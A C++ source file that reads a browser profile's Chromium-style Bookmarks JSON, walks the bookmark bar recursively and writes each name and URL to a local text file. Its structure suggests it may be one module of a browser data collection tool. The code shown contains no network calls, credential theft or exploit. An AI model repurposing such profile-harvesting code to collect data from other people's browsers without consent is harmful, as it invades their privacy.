//
// Created by .1qxz on 08.06.2024.
//

#include "CBookmarks.h"

void CBookmarks::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    std::string data = Utils::readFile(this->getProfileDir(browser_root) / "Bookmarks");

    if(data.empty())
        return;

    json j = json::parse(data);
    std::stringstream output;

    if (j.contains("roots") && j["roots"].contains("bookmark_bar")) {
        try
        {
            CBookmarks::printBookmark(j["roots"]["bookmark_bar"], output);
        }
        catch (...) {} // ignored
    }

    Utils::writeFile(root / "Bookmarks.txt", output.str(), true);
}

void CBookmarks::printBookmark(const json &j, std::stringstream &ss) {
    if (j.contains("url")) {
        ss << "Name: " << j["name"] << "\n";
        ss << "Url: " << j["url"] << "\n";
        ss << "\n";
    } else if (j.contains("children")) {
        for (const auto& child : j["children"]) {
            printBookmark(child, ss);
        }
    }
}
